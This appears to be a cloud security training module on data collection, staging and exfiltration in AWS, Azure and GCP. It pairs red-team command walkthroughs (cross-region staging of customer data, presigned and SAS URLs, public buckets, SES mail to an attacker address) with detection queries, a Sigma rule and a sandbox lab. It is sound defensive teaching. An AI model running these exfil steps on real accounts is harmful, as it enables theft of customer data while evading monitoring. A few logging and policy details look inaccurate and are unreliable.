# 09 — Collection, Data Staging & Exfil Channels

> **Level:** Advanced
> **Prereqs:** [Content Discovery & Data Staging](../Storage-Data-Security/content-discovery-and-data-staging.md), [Credential Theft & Token Physics](credential-theft-and-token-physics.md) through [Lateral Movement & Pivoting](lateral-movement-and-pivoting.md)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Collection (T1530, T1005, T1074), Exfiltration (T1020, T1048, T1567)
**Authorization scope:** Run only against your own sandbox accounts / sanctioned engagement with written authorization. All buckets, URLs, and IPs below are placeholders.

## What & why
Collection and exfiltration in cloud exploit the victim's own infrastructure: S3 buckets, Azure Blob storage, GCS buckets, and platform email services (SES, SendGrid, Email Communication Service). The attacker stages data inside the victim's environment — often in a different region to avoid anomaly clustering — then exfiltrates via blended HTTPS traffic that looks like legitimate application egress.

## The OnPrem reality
On-prem exfil channels include DNS tunneling (`iodine`, `dnscat2`), ICMP tunnels, FTP to external servers, HTTP POST to attacker-controlled domains, and physical USB exfil. Network DLP could inspect these protocols. Cloud exfil is harder to distinguish because it often uses the same HTTPS endpoints as legitimate applications.

## Core concepts

### Collection & exfil lifecycle

```
Collection → Staging → Packaging → Obfuscation → Exfil Channel → Command & Control Confirmation
```

### Collection opportunities in cloud

| Data Type | AWS Source | Azure Source | GCP Source |
|---|---|---|---|
| Object storage data | S3 buckets | Blob containers | GCS buckets |
| Database contents | RDS snapshots, DynamoDB tables | Azure SQL, Cosmos DB | Cloud SQL, BigQuery, Firestore |
| Secrets/credentials | Secrets Manager, Parameter Store | Key Vault | Secret Manager |
| Source code | CodeCommit, ECR images | Azure Repos, ACR images | Cloud Source Repos, Artifact Registry |
| Logs/telemetry | CloudWatch Logs | Log Analytics workspaces | Cloud Logging |
| IAM metadata | IAM users/roles/policies | Azure AD users/groups/apps | IAM members/bindings |
| Infrastructure config | CloudFormation templates, Terraform state | ARM/Bicep templates | Deployment Manager configs |

### Exfil channels cross-cloud matrix

| Exfil Channel | AWS | Azure | GCP | OnPrem |
|---|---|---|---|---|
| **Object storage public access** | Make S3 bucket public, share pre-signed URL | Generate SAS token with read access, or make blob public | Make GCS bucket public, generate signed URL | Anonymous FTP server |
| **Legitimate HTTPS egress** | `s3:GetObject` via pre-signed URL over HTTPS | Blob download over HTTPS | GCS download over HTTPS | HTTPS POST to external server |
| **Email service** | SES — send data as email attachment | Email Communication Service (ACS) | SendGrid API (integrated) | SMTP relay |
| **DNS exfil** | Route 53 DNS query logs to attacker-controlled domain | Azure DNS — exfil via TXT record queries | Cloud DNS — queries to attacker domain | `iodine`, `dnscat2` |
| **Pre-signed URL / SAS token** | `s3:GetObject` pre-signed URL with long TTL | Blob SAS token with `r` permission | GCS V4 signed URL with `GET` | N/A |
| **API-based streaming** | S3 Select to read and stream data | Azure Data Lake Storage query | BigQuery export to external table | RDP clipboard |
| **Serverless function egress** | Lambda → external HTTPS endpoint | Azure Function → external HTTPS | Cloud Function → external HTTPS | Outbound HTTPS from compromised host |

## AWS

### Collection: staging data in S3

```bash
# Step 1: Identify high-value S3 buckets
aws s3 ls

# Step 2: Create a staging bucket in a different region (reduces anomaly clustering)
aws s3api create-bucket \
  --bucket staging-cdn-assets-2026 \
  --region eu-west-1 \
  --create-bucket-configuration LocationConstraint=eu-west-1

# Step 3: Copy target data to staging bucket
aws s3 sync s3://prod-data-bucket/customer-data/ s3://staging-cdn-assets-2026/customer-data/
# CloudTrail: GetObject + PutObject data events (if enabled)

# Step 4: Generate pre-signed URLs for exfil (contained — localhost only)
aws s3 presign s3://staging-cdn-assets-2026/customer-data/export.csv \
  --expires-in 3600
# Returns: https://staging-cdn-assets-2026.s3.eu-west-1.amazonaws.com/customer-data/export.csv?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=...
# This URL is valid for 1 hour — anyone with the URL can download the file
```

### Exfil: pre-signed URL egress

The pre-signed URL is a powerful exfil channel because:
- The download uses legitimate AWS infrastructure over HTTPS.
- The download IP is the *recipient's* IP, not the *stager's* IP.
- If S3 data events are not enabled, the download is invisible.
- The URL itself looks like routine S3 traffic.

```bash
# Attacker's perspective (contained — downloading from their own sandbox):
curl -o exfiltrated.csv "https://staging-cdn-assets-2026.s3.eu-west-1.amazonaws.com/customer-data/export.csv?X-Amz-Algorithm=..."
```

**Detection counterpoint:** `s3:GetObject` generates `S3.GetObject` in CloudTrail data events (if enabled). The event includes `sourceIPAddress` (the exfiltrator's IP) and `userAgent`. Pre-signed URL generation itself (`s3:PutObject` creation of the URL) is NOT a CloudTrail event — only the underlying CLI call that generates the URL is logged as `GetObject` on the CLI side.

### Exfil via SES (email)

```bash
# SES can send up to the account's sending limit per 24h
# Verify your SES domain/sending status first (sandbox mode is restrictive)
aws ses send-email \
  --from "noreply@example.com" \
  --destination "ToAddresses=attacker-collection@example.com" \
  --message "Subject={Data=Export,Charset=UTF-8},Body={Text={Data=$(base64 < /tmp/data.txt),Charset=UTF-8}}"
# CloudTrail: SendEmail event logged
# Data may transit via SES, hitting the account's sending quota
```

## Azure

### Collection: staging data in Storage Account

```bash
# Step 1: Create a storage account in a different region
az storage account create \
  --name stagingassets2026 \
  --resource-group example-rg \
  --location westeurope \
  --sku Standard_LRS

# Step 2: Copy data from source to staging
az storage blob copy start \
  --source-account-name proddataaccount \
  --source-container customer-data \
  --source-blob export.csv \
  --account-name stagingassets2026 \
  --destination-container staging \
  --destination-blob export.csv

# Step 3: Generate a SAS token with read access
END_DATE=$(date -v+1d -u +%Y-%m-%dT%H:%M:%SZ)
az storage container generate-sas \
  --account-name stagingassets2026 \
  --name staging \
  --permissions r \
  --expiry "$END_DATE" \
  --output tsv
# Returns: se=2026-06-23T12%3A00%3A00Z&sig=...&spr=https&sv=2023-01-01&sr=c&...

# Full download URL:
# https://stagingassets2026.blob.core.windows.net/staging/export.csv?<SAS-TOKEN>
```

**Detection:** Azure Storage Analytics (if enabled) logs `GetBlob` operations with `CallerIpAddress` and `UserAgentHeader`. The SAS token generation is logged as `ListAccountSas` or `GenerateUserDelegationKey` in Activity Log.

### Exfil via Azure Function HTTPS

```bash
# Create a Function that proxies data out
az functionapp create \
  --name staging-processor \
  --resource-group example-rg \
  --storage-account stagingassets2026 \
  --runtime python \
  --consumption-plan-location eastus

# The function reads from staging and POSTs to an external endpoint
# (This is pseudocode — do not implement live)
```

## GCP

### Collection: staging data in GCS

```bash
# Step 1: Create a staging bucket
gcloud storage buckets create gs://staging-cdn-assets-2026 \
  --location=EU

# Step 2: Copy target data
gcloud storage cp gs://prod-customer-data/export.csv gs://staging-cdn-assets-2026/

# Step 3: Generate a signed URL for download
gcloud storage sign-url gs://staging-cdn-assets-2026/export.csv \
  --duration=1h \
  --http-verb=GET
# Returns: https://storage.googleapis.com/staging-cdn-assets-2026/export.csv?Expires=...

# Step 4: Make bucket temporarily public (alternative approach)
gcloud storage buckets add-iam-policy-binding gs://staging-cdn-assets-2026 \
  --member=allUsers \
  --role=roles/storage.objectViewer
# Now any URL like https://storage.googleapis.com/staging-cdn-assets-2026/export.csv works
```

**Detection:** `storage.objects.get` in Data Access audit logs (if enabled). IAM binding change (`SetIamPolicy`) is logged as Admin Activity and is high-signal.

### Exfil via BigQuery export

```bash
# Extract data from BigQuery to a GCS bucket, then exfiltrate
bq extract \
  --destination_format CSV \
  'project:dataset.customer_table' \
  gs://staging-cdn-assets-2026/customer_export.csv
```

## OnPrem mapping (recap table)

| Exfil Channel | OnPrem | AWS | Azure | GCP |
|---|---|---|---|---|
| HTTPS object download | HTTPS POST to C2 | S3 pre-signed URL (HTTPS) | Blob SAS URL (HTTPS) | GCS signed URL (HTTPS) |
| Email exfil | SMTP relay | SES `SendEmail` | ACS email | SendGrid (integrated) |
| DNS tunneling | `iodine`, `dnscat2` | Route 53 query to C2 domain | Azure DNS query to C2 | Cloud DNS query to C2 |
| Staging destination | `/tmp` or hidden directory on host | S3 bucket in different region | Storage account in different region | GCS bucket in different location |
| Anomalous byte count detection | NetFlow analysis | VPC Flow Logs + bytes transferred | NSG Flow Logs | VPC Flow Logs |
| Pre-signed URL detection | N/A | `PutObject` without data events = invisible | SAS token generation = `ListAccountSas` | Signed URL generation = `SignBlob` |

## 🔴 Red Team view

### Pre-signed URL exfil narrative (contained)

```
T-00:00 — Attacker has iam:AssumeRole on a role with s3:GetObject on prod-data-bucket.
T-00:05 — Attacker enumerates: aws s3 ls s3://prod-data-bucket/
T-00:10 — Attacker identifies customer-data/export.csv (1.2 GB).
T-00:12 — Attacker creates staging bucket in eu-west-1 (different from us-east-1 prod).
T-00:15 — aws s3 sync s3://prod-data-bucket/customer-data/ s3://staging-cdn-2026/customer-data/
T-00:25 — aws s3 presign s3://staging-cdn-2026/customer-data/export.csv --expires-in 43200
T-00:26 — Attacker sends pre-signed URL to external collection point.
T-00:26 to T-12:26 — Collection point downloads the file repeatedly (replayable URL).
T-12:26 — URL expires. Attacker deletes staging bucket.
```

**Key insight:** The pre-signed URL download looks identical to any other S3 API call. If the S3 bucket has CloudFront in front, the download uses CloudFront's IP. The only anomaly is the client IP and the volume.

### Why it's hard to detect

- **No malicious destination IP** — download goes to `s3.amazonaws.com`, which is in every org's allow list.
- **HTTPS** — content is encrypted; network DLP can't inspect.
- **Rotating pre-signed URLs** — attacker can generate new URLs every few minutes, each with a different signature.
- **Normal-appearing traffic** — S3 `GetObject` with 1–2 GB payload looks like a legitimate application downloading a dataset.
- **Blending with CDN traffic** — if the org uses CloudFront+S3, the volume and pattern match CDN behavior.

### Artifacts left by exfil

| Artifact | Log Source | Visibility |
|---|---|---|
| `s3:ListBucket` on source bucket | CloudTrail management | Always |
| `s3:GetObject` on source objects | CloudTrail data events | If enabled |
| `s3:PutObject` to staging bucket | CloudTrail data events | If enabled |
| Pre-signed URL generation | **NOT a CloudTrail event** (generated client-side from credentials) | But `GetObject` call that generates it IS logged |
| `s3:GetObject` on staging objects | CloudTrail data events | If enabled |
| Elevated bytes-out in VPC Flow Logs | VPC Flow Logs | If enabled |
| S3 server access logs | S3 access logs | If enabled |

## 🔵 Blue Team view

### Egress controls

1. **AWS: VPC endpoints with endpoint policies**
   ```json
   {
     "Effect": "Allow",
     "Action": "s3:GetObject",
     "Resource": "arn:aws:s3:::prod-data-bucket/*",
     "Condition": {
       "StringEquals": {
         "aws:SourceVpce": "vpce-0abcdef1234567890"
       },
       "IpAddress": {
         "aws:SourceIp": "10.0.0.0/8"
       }
     }
   }
   ```

2. **Azure: Storage account network rules — allow only specific VNets/IPs**
   ```bash
   az storage account update \
     --name proddataaccount \
     --default-action Deny \
     --bypass AzureServices
   az storage account network-rule add \
     --account-name proddataaccount \
     --vnet-name prod-vnet \
     --subnet data-subnet
   ```

3. **GCP: VPC Service Controls — create a service perimeter**
   ```bash
   gcloud access-context-manager perimeters create prod-perimeter \
     --title="Production Data Perimeter" \
     --resources=projects/111111111111 \
     --restricted-services=storage.googleapis.com \
     --access-levels=allowed-corp-ips
   ```

### Detecting anomalous S3 egress

```sql
-- Athena: find S3 GetObject with unusually large response elements
SELECT eventtime, useridentity.arn, sourceipaddress,
       requestparameters.key,
       additionaleventdata.bytesscanned,
       additionaleventdata.bytesreturned
FROM cloudtrail_logs
WHERE eventname = 'GetObject'
  AND sourceipaddress NOT IN ('10.0.0.0/8', '172.16.0.0/12')
  AND eventtime > now() - interval '1' day
ORDER BY CAST(additionaleventdata.bytesreturned AS bigint) DESC
LIMIT 20;
```

### DNS exfil detection

```sql
-- Count unique subdomains per source IP (DNS exfil uses many unique subdomains)
SELECT src_ip, COUNT(DISTINCT query_name) AS unique_queries,
       SUM(query_length) AS total_bytes
FROM dns_logs
WHERE query_type = 'TXT'
  AND query_name LIKE '%.example.com' -- attacker's domain
  AND event_time > now() - interval '1' hour
GROUP BY src_ip
HAVING COUNT(DISTINCT query_name) > 50;
```

### SES sending domain allowlist

```bash
# AWS: SCP to restrict SES sending to verified domains only
{
  "Effect": "Deny",
  "Action": "ses:SendEmail",
  "Resource": "*",
  "Condition": {
    "StringNotLike": {
      "ses:FromAddress": "*@example.com"
    }
  }
}
```

### Network flow anomaly detection

```sql
-- Detect anomalous bytes-out to S3 from a single principal
SELECT useridentity.arn,
       SUM(CAST(additionaleventdata.bytesreturned AS bigint)) AS total_bytes_out
FROM cloudtrail_logs
WHERE eventname = 'GetObject'
  AND eventtime > now() - interval '1' hour
GROUP BY useridentity.arn
HAVING SUM(CAST(additionaleventdata.bytesreturned AS bigint)) > 1073741824  -- 1 GB
ORDER BY total_bytes_out DESC;
```

## Hands-on lab

**Objective:** Simulate collection → staging → pre-signed URL exfil in your sandbox, then detect it with CloudTrail data events.

1. **Enable S3 data events on your sandbox bucket:**
   ```bash
   TRAIL_NAME=$(aws cloudtrail describe-trails --query 'trailList[0].Name' --output text)
   aws cloudtrail put-event-selectors --trail-name "$TRAIL_NAME" \
     --event-selectors '[{"ReadWriteType":"All","IncludeManagementEvents":true,"DataResources":[{"Type":"AWS::S3::Object","Values":["arn:aws:s3:::your-sandbox-bucket/"]}]}]'
   ```

2. **Create test data and stage it:**
   ```bash
   head -c 100000 /dev/urandom | base64 > /tmp/sensitive-data.csv
   aws s3 cp /tmp/sensitive-data.csv s3://your-sandbox-bucket/sensitive-data.csv
   aws s3 ls s3://your-sandbox-bucket/
   ```

3. **Generate a pre-signed URL and download:**
   ```bash
   URL=$(aws s3 presign s3://your-sandbox-bucket/sensitive-data.csv --expires-in 3600)
   curl -o /tmp/exfiltrated.csv "$URL"
   diff /tmp/sensitive-data.csv /tmp/exfiltrated.csv && echo "Exfil successful"
   ```

4. **Check CloudTrail for the events:**
   ```bash
   sleep 120
   aws cloudtrail lookup-events --lookup-attributes \
     AttributeKey=EventName,AttributeValue=GetObject --max-results 5
   aws cloudtrail lookup-events --lookup-attributes \
     AttributeKey=EventName,AttributeValue=PutObject --max-results 5
   ```

**Expected output:** GetObject and PutObject events visible in CloudTrail (proving data events work). The pre-signed URL download appears as `GetObject` with `sourceIPAddress` of your workstation.

**Teardown:**
```bash
aws s3 rm s3://your-sandbox-bucket/sensitive-data.csv
rm /tmp/sensitive-data.csv /tmp/exfiltrated.csv
```

## Detection rules & checklists

### Sigma rule: High-volume S3 GetObject

```yaml
title: High-Volume S3 Object Download
status: experimental
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventName: GetObject
  timeframe: 1h
  condition: selection | count() by userIdentity.arn > 50
level: medium
```

### Cloud Custodian: block public S3 buckets

```yaml
policies:
  - name: block-public-buckets
    resource: aws.s3
    filters:
      - type: bucket-policy
        key: Statement[]
        value:
          - Principal: "*"
        op: contains
    actions:
      - type: set-bucket-encryption
        crypto: AES256
      - type: notify
        template: public-bucket-alert
```

### CLI audit one-liners

```bash
# AWS: Find S3 buckets with public access
aws s3api list-buckets --query 'Buckets[].Name' --output text | while read b; do
  status=$(aws s3api get-public-access-block --bucket "$b" --query 'PublicAccessBlockConfiguration' 2>/dev/null)
  echo "$b: $status"
done

# Azure: Find storage accounts with public blob access
az storage account list --query "[?allowBlobPublicAccess==\`true\`].{Name:name,ResourceGroup:resourceGroup}"

# GCP: Find public GCS buckets
gcloud storage buckets list --format=json | jq -r '.[].name' | while read b; do
  gcloud storage buckets get-iam-policy "$b" --format=json | \
    jq -e '.bindings[] | select(.members[] | contains("allUsers"))' > /dev/null && echo "PUBLIC: $b"
done
```

## References

- [AWS S3 Pre-signed URLs](https://docs.aws.amazon.com/AmazonS3/latest/userguide/using-presigned-url.html)
- [AWS SES Sending Limits](https://docs.aws.amazon.com/ses/latest/dg/manage-sending-limits.html)
- [Azure Storage SAS](https://learn.microsoft.com/en-us/azure/storage/common/storage-sas-overview)
- [GCP Signed URLs](https://cloud.google.com/storage/docs/access-control/signed-urls)
- [VPC Service Controls](https://cloud.google.com/vpc-service-controls/docs/overview)
- [MITRE ATT&CK Exfiltration (T1020, T1048)](https://attack.mitre.org/tactics/TA0010/)
- See also: [04-Data-Protection/dlp-and-data-classification.md](../Storage-Data-Security/dlp-and-data-classification.md)
- See also: [09-08-evasion-and-trail-free-actions.md](./evasion-and-trail-free-actions.md)
